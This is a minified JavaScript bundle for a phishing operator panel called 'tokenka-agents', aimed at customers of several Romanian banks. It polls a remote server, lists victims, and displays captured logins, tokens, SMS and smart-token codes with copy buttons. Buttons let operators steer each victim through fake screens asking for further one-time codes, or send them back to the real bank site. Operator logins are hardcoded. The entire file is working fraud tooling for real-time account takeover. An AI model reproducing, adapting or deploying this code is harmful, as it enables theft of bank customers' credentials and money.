(this["webpackJsonptokenka-agents"]=this["webpackJsonptokenka-agents"]||[]).push([[0],{26:function(e,t,n){e.exports=n(52)},31:function(e,t,n){},32:function(e,t,n){},52:function(e,t,n){"use strict";n.r(t);var a=n(0),r=n.n(a),c=n(23),s=n.n(c),i=(n(31),n(32),n(3)),o=n(7),u=n(8),l=n(12),E=n(11),d=n(6),m=n(25),_=n(5),v=n.n(_),O=n(13),S=n(24),N=n.n(S),T=n(10),f=n.n(T),g=function(e,t){return Object.keys(t).reduce((function(t,n){return t[n]=e?"".concat(e,".").concat(n):"".concat(n),t}),{})},I=function(e){return g(void 0,e)},p=I({RAIFFEISEN:void 0,UNI_CREDIT:void 0,ALPHA:void 0,BCR:void 0,PRO_CREDIT:void 0}),R=I({NEW:void 0,OLD:void 0,IGNORE:void 0,IMPORTANT:void 0}),A=g("USER",{ENTER_HOMEPAGE:void 0,NEW_USER:void 0,TYPING:void 0,LOGGING:void 0,SEND_CREDENTIALS:void 0,SEND_TOKEN:void 0,SEND_SMS:void 0,SEND_TECH_DATA:void 0,RAIF_SEND_AUTH_CODE:void 0,RAIF_SEND_SMART_TOKEN:void 0,RAIF_SEND_SMART_TOKEN_SMS:void 0,UNICREDIT_SEND_IMAGE:void 0}),b=g("INSTR",{GO_TO_HOME_SCREEN:void 0,SHOW_LOADING_STATE:void 0,ERR_MSG_INVALID_CREDENTIALS:void 0,GO_TO_ORIGINAL_SITE:void 0,GO_TO_TOKEN_SCREEN:void 0,GO_TO_SMS_SCREEN:void 0,GO_TO_TECH_SCREEN:void 0,RAIF_GO_TO_AUTH_CODE_SCREEN:void 0,RAIF_GO_TO_SMART_TOKEN:void 0,RAIF_GO_TO_SMART_TOKEN_SMS:void 0,UNICREDIT_GO_TO_IMAGE:void 0}),C=[A.SEND_CREDENTIALS,A.SEND_TOKEN,A.SEND_SMS,A.RAIF_SEND_AUTH_CODE,A.RAIF_SEND_SMART_TOKEN,A.RAIF_SEND_SMART_TOKEN_SMS,A.UNICREDIT_SEND_IMAGE],k={get agent(){return JSON.parse(sessionStorage.getItem("agent"))},set agent(e){sessionStorage.setItem("agent",JSON.stringify(e))},get bank(){return JSON.parse(sessionStorage.getItem("bank"))},set bank(e){sessionStorage.setItem("bank",JSON.stringify(e))},get agents(){return[{id:1,username:"agent1",password:"1passw"},{id:2,username:"agent2",password:"2passw"},{id:3,username:"agent3",password:"passw3"},{id:4,username:"agent4",password:"passw4"},{id:7,username:"admin",password:"1admin1"}]}},D=function(e){return e.lockedBy===k.agent.id},M=function(e){return e.status===R.IMPORTANT},h=function(e){return e.status===R.IGNORE},y=Object(i.a)(Object(i.a)({},{restURL:"https://paymentsonline.a2hosted.com/token/rest"}),{},{pullingInterval:1300}),G=y.restURL,j=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"GET",n=arguments.length>2?arguments[2]:void 0,a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{updateLastActive:!0},r=(a.updateLastActive,k.lastActive||0);return N()({url:"".concat(G).concat(e),method:t,data:n,headers:{"last-active":r}}).then((function(e){return e.data})).then((function(e){return k.lastActive=e.lastActive,e.data}))},w=new Audio("/pew.wav"),F=new Audio("/fart.wav"),L=function(e){var t=e.users,n=e.messages;(function(e){return e.reduce((function(e,t){var n=t.status,a=t.lockedBy;return e||n===R.NEW&&!a}),!1)})(t)&&w.play(),function(e){return!!e.find((function(e){return C.includes(e.action)}))}(n)&&F.play()},P=y.pullingInterval,H={init:!1,start:function(e,t){var n=this;setInterval(Object(O.a)(v.a.mark((function t(){var a;return v.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,j("/agent/data/".concat(k.agent.id));case 2:a=t.sent,n.init&&L(a),n.init=!0,e(a);case 6:case"end":return t.stop()}}),t)}))),P)},send:function(e,t){return Object(O.a)(v.a.mark((function n(){return v.a.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:j("/message","PUT",{userId:e,action:t}).catch((function(e){return window.alert("Error for",t.type)}));case 1:case"end":return n.stop()}}),n)})))()}},U=function(e,t,n){return t.forEach((function(t){var n=e.findIndex((function(e){return e.id===t.id}));n<0?(e.push(t),setTimeout((function(){t.status===R.NEW&&(t.status=R.OLD)}),1e4)):e[n]=t})),e.reduce((function(e,t){var a=!!n.find((function(e){return e.userId===t.id}));return[].concat(Object(m.a)(e),[Object(i.a)(Object(i.a)({},t),{},{newMsg:a})])}),[])},K=function(e,t){var n=t.length&&t[t.length-1].action===A.TYPING,a=t.reduce((function(e,t){return function(e){return C.includes(e.action)}(t)&&(e.tokens.push(t.payload),e.lastImportantMsgTmstp=t.time),e}),{tokens:[],lastImportantMsgTmstp:null}),r=Object(i.a)(Object(i.a)({},e),{},{isTyping:n,tokens:a.tokens,lastImportantMsgTmstp:a.lastImportantMsgTmstp,messages:t});return setTimeout((function(){r.isTyping=!1}),2e3),r},x=n(1),z=Object(a.createContext)(),B=function(e){var t=Object(a.useState)(void 0),n=Object(x.a)(t,2),c=n[0],s=n[1];return r.a.createElement(z.Provider,{value:[c,s]},e.children)},W=function(e,t){return function(n){n.stopPropagation();var a=t?k.agent.id:void 0;j("/agent/lockUser","POST",{userId:e,agentId:a})}};function J(e){var t=e.user,n=Object(a.useContext)(z),c=Object(x.a)(n,2),s=c[0],i=c[1];return r.a.createElement("div",{className:"user ".concat(t.id===s&&"selected"," ").concat(M(t)&&"important"),onClick:function(){i(t.id),j("/agent/readUserMessages","POST",{userId:t.id,agentId:k.agent.id})}},r.a.createElement("div",{className:"user-info-descr"},r.a.createElement("div",{className:"user-id"},t.id),r.a.createElement("div",{className:"user-status ".concat(M(t)&&"important"," ").concat(h(t)&&"ignored")},t.status),r.a.createElement("div",null,t.description)),r.a.createElement("div",{className:"user-info-tokens"},r.a.createElement("div",null,"Tokens: ",r.a.createElement("b",null,t.tokens.length)),t.newMsg&&r.a.createElement("div",null,r.a.createElement("img",{src:"/msg.png",height:"44"}))),r.a.createElement("div",{className:"user-actions"},r.a.createElement(V,{user:t})))}function V(e){var t,n=e.user,c=n.id,s=n.lockedBy,i=s&&k.agents.find((function(e){return e.id===s})),o=D(n);return r.a.createElement("div",{className:"user-lock ".concat((t=n,t.lockedBy&&"locked")," ").concat(o&&"lockedByMe")},s?r.a.createElement(a.Fragment,null,r.a.createElement("span",null,"Locked by ",r.a.createElement("b",null,o?"me":i.username)),o&&r.a.createElement("button",{onClick:W(c,!1)},"unlock")):r.a.createElement("button",{onClick:W(c,!0)},"lock"))}r.a.Component;function Y(e){var t=e.usersData,n=ee(Object.values(t)),c=Object(a.useState)(""),s=Object(x.a)(c,2),i=s[0],o=s[1],u=te(n,i);return r.a.createElement("div",{className:"users-container "},r.a.createElement($,{filter:i,setFilter:o}),r.a.createElement("div",{className:"sidebar users "},u.map((function(e){return r.a.createElement(J,{key:e.id,user:e})}))))}function $(e){var t=e.filter,n=e.setFilter;return r.a.createElement("div",{className:"users-filter"},"Filter ",r.a.createElement("input",{type:"text",value:t,onChange:function(e){return n(e.target.value)}}),r.a.createElement("button",{onClick:function(){return n("")}},"clear"))}var q=function(e){return function(t){return e(t)?-1:1}},Q=q(D),X=q(M),Z=q(h),ee=function(e){return e.sort((function(e,t){var n=Z(e),a=Z(t);if(n!==a)return a-n;var r=Q(e),c=Q(t);if(r!==c)return r-c;var s=X(e),i=X(t);if(s!==i)return s-i;var o=e.lastImportantMsgTmstp,u=t.lastImportantMsgTmstp;return o&&u?u-o:!o&&u?1:o&&!u?-1:t.id-e.id}))},te=function(e,t){return t&&""!==t.trim()?e.filter((function(e){return e.id.toString().includes(t)||e.description&&e.description.includes(t)})):e};function ne(e){var t=e.usersData,n=Object(a.useContext)(z),c=Object(x.a)(n,1)[0],s=t[c];return r.a.createElement("div",{className:"messages sidebar"},s&&r.a.createElement("div",null,r.a.createElement("div",null,r.a.createElement(J,{user:s})),r.a.createElement(ae,{messages:s.messages}),r.a.createElement(oe,{userId:c})))}function ae(e){var t=e.messages;return r.a.createElement("div",{className:"user-messages"},t&&t.map((function(e){return r.a.createElement(ce,{key:e.id,message:e})})))}var re=function(e){return e.includes("USER")};function ce(e){var t=e.message,n=t.action,a=t.payload,c=t.time,s=null;switch(n){case A.SEND_CREDENTIALS:case A.SEND_TOKEN:case A.SEND_SMS:case A.SEND_TECH_DATA:case A.RAIF_SEND_AUTH_CODE:case A.RAIF_SEND_SMART_TOKEN:case A.RAIF_SEND_SMART_TOKEN_SMS:case A.UNICREDIT_SEND_IMAGE:s=se;break;case b.GO_TO_HOME_SCREEN:case b.GO_TO_TOKEN_SCREEN:case b.RAIF_GO_TO_AUTH_CODE_SCREEN:case b.GO_TO_SMS_SCREEN:case b.GO_TO_TECH_SCREEN:case b.GO_TO_ORIGINAL_SITE:case b.RAIF_GO_TO_SMART_TOKEN:case b.RAIF_GO_TO_SMART_TOKEN_SMS:case b.ERR_MSG_INVALID_CREDENTIALS:case b.SHOW_LOADING_STATE:case b.UNICREDIT_GO_TO_IMAGE:s=ie}return s?r.a.createElement("div",{className:"".concat(re(n)?"user-msg":"agent-msg")},r.a.createElement("div",{className:"msg-item"},r.a.createElement("div",{className:"msg-time"},f()(c).format("HH:mm:ss")),r.a.createElement("div",{className:"msg-action"},r.a.createElement(s,{action:n,payload:a})))):null}function se(e){var t,n=e.action,c=e.payload;switch(n){case A.SEND_CREDENTIALS:t="Credentials";break;case A.SEND_TOKEN:t="Token";break;case A.RAIF_SEND_AUTH_CODE:t="Pers fizice Auth code";break;case A.SEND_SMS:t="Pers fizice SMS code";break;case A.RAIF_SEND_SMART_TOKEN:t="Pers fizice Smart Token";break;case A.RAIF_SEND_SMART_TOKEN_SMS:t="Pers fizice Smart Token SMS";break;case A.SEND_TECH_DATA:t="Technical data";break;case A.UNICREDIT_SEND_IMAGE:t="Pers fizice image"}return r.a.createElement("div",{className:"msg-payload"},r.a.createElement("label",null,t,":"),c&&c.split(";;").map((function(e){return r.a.createElement(a.Fragment,null,r.a.createElement("span",{className:"msg-payload-value"},e),r.a.createElement("button",{onClick:function(){!function(e){var t=document.createElement("textarea");t.value=e,t.setAttribute("readonly",""),t.style={position:"absolute",left:"-9999px"},document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t)}(e)}},"copy"))})))}function ie(e){var t=e.action,n=e.payload;return r.a.createElement("div",null,r.a.createElement("label",null,t),r.a.createElement("span",{className:"msg-payload-value"},n))}function oe(e){var t=e.userId,n=Object(a.useState)(""),c=Object(x.a)(n,2),s=c[0],i=c[1];return r.a.createElement("div",{className:"agent-actions"},r.a.createElement("h3",{style:{margin:"0px"}},k.bank),r.a.createElement("div",{className:"agent-actions-update-user"},r.a.createElement("div",{className:"agent-action-description"},r.a.createElement("input",{type:"text",value:s,onChange:function(e){return i(e.target.value)}}),r.a.createElement("button",{onClick:function(){return le(t,s,i)}},"add description")),r.a.createElement("div",{className:"agent-action-status"},r.a.createElement("button",{onClick:function(){return Ee(t,R.IGNORE)}},"Ignore"),r.a.createElement("button",{onClick:function(){return Ee(t,R.IMPORTANT)}},"Important"))),r.a.createElement("div",{className:"agent-action-instructions"},r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.GO_TO_HOME_SCREEN})}},"Home"),r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.GO_TO_SMS_SCREEN})}},"Pers fizice SMS Code"),r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.GO_TO_TECH_SCREEN})}},"Technical Works"),r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.GO_TO_ORIGINAL_SITE})}},"Original site"),r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.ERR_MSG_INVALID_CREDENTIALS})}},"Error Credentials"),r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.SHOW_LOADING_STATE})}},"Show Loading ...")),r.a.createElement(ue,{userId:t,type:b.GO_TO_TOKEN_SCREEN,text:"Token"}),r.a.createElement("div",null,k.bank===p.RAIFFEISEN&&r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.RAIF_GO_TO_AUTH_CODE_SCREEN})}},"Pers fizice Auth Code"),r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.RAIF_GO_TO_SMART_TOKEN})}},"Pers fizice Smart Token"),r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.RAIF_GO_TO_SMART_TOKEN_SMS})}},"Pers fizice Smart Token SMS")),k.bank===p.UNI_CREDIT&&r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return H.send(t,{type:b.UNICREDIT_GO_TO_IMAGE})}},"Pers fizice Image"))))}function ue(e){var t=e.userId,n=e.type,c=e.text,s=Object(a.useState)(""),i=Object(x.a)(s,2),o=i[0],u=i[1];return r.a.createElement(a.Fragment,null,r.a.createElement("input",{type:"text",value:o,onChange:function(e){return u(e.target.value)}}),r.a.createElement("button",{onClick:function(){H.send(t,{type:n,payload:o}),u("")}},c))}var le=function(e,t,n){j("/agent/description","POST",{userId:e,description:t}),n("")},Ee=function(e,t){j("/agent/status","POST",{userId:e,status:t})},de=function(e){Object(l.a)(n,e);var t=Object(E.a)(n);function n(){var e;return Object(o.a)(this,n),(e=t.call(this)).state={messages:[],users:[]},e}return Object(u.a)(n,[{key:"componentDidMount",value:function(){var e=this;console.log("****init"),H.start((function(t){var n,a,r=t.users,c=t.messages,s=t.unread;console.log("data",{users:r,messages:c,unread:s}),e.setState(Object(i.a)(Object(i.a)({},e.state),{},{users:U(e.state.users,r,s),messages:(n=e.state.messages,a=c,a.reduce((function(e,t){var n;return n=t,e.find((function(e){return e.id===n.id}))||e.push(t),e}),n))}))}))}},{key:"render",value:function(){var e=this.state,t=function(e,t){return e.reduce((function(e,n){return Object(i.a)(Object(i.a)({},e),{},Object(d.a)({},n.id,K(n,function(e,t){return t.filter((function(t){return t.userId===e.id}))}(n,t))))}),{})}(e.users,e.messages);return r.a.createElement("div",null,r.a.createElement("div",{className:"welcome"},r.a.createElement(B,null,r.a.createElement(Y,{usersData:t}),r.a.createElement(ne,{usersData:t}))))}}]),n}(r.a.Component);function me(e){var t=k.agent&&Oe(k.agent.username,k.agent.password),n=Object(a.useState)(t),c=Object(x.a)(n,2),s=c[0],i=c[1];return s?r.a.createElement(a.Fragment,null,e.children):r.a.createElement(_e,{setLogged:i})}function _e(e){var t=e.setLogged,n=Object(a.useState)(""),c=Object(x.a)(n,2),s=c[0],i=c[1],o=Object(a.useState)(""),u=Object(x.a)(o,2),l=u[0],E=u[1],d=Object(a.useState)(p.ALPHA),m=Object(x.a)(d,2),_=m[0],v=m[1],O=Object(a.useState)(!1),S=Object(x.a)(O,2),N=S[0],T=S[1];return r.a.createElement("div",{className:"login"},r.a.createElement("div",null,r.a.createElement("select",{id:"banks",name:"banks",onChange:function(e){return v(e.target.value)},defaultValue:p.PRO_CREDIT},r.a.createElement("option",{value:p.ALFA},p.ALPHA),r.a.createElement("option",{value:p.RAIFFEISEN},p.RAIFFEISEN),r.a.createElement("option",{value:p.UNI_CREDIT},p.UNI_CREDIT),r.a.createElement("option",{value:p.BCR},p.BCR),r.a.createElement("option",{value:p.PRO_CREDIT},p.PRO_CREDIT))),r.a.createElement("div",null,r.a.createElement("input",{type:"text",value:s,onChange:function(e){return i(e.target.value)},placeholder:"username"})),r.a.createElement("div",null,r.a.createElement("input",{type:"password",value:l,onChange:function(e){return E(e.target.value)},placeholder:"password"})),r.a.createElement("div",null,r.a.createElement("button",{onClick:function(e){return ve(s,l,T,t,_)}},"login")),N&&r.a.createElement("div",{className:"error"},"Invalid Credentials"))}var ve=function(e,t,n,a,r){var c=Oe(e,t);k.bank=r,c?(k.agent=c,n(!1),a(!0)):n(!0)},Oe=function(e,t){return k.agents.find((function(n){return n.username===e&&n.password===t}))};console.log("ENV:","production");var Se=function(){return r.a.createElement("div",{className:"App"},r.a.createElement(me,null,r.a.createElement(de,null)))};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));s.a.render(r.a.createElement(r.a.StrictMode,null,r.a.createElement(Se,null)),document.getElementById("root")),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then((function(e){e.unregister()})).catch((function(e){console.error(e.message)}))}},[[26,1,2]]]);
//# sourceMappingURL=main.79fca6eb.chunk.js.map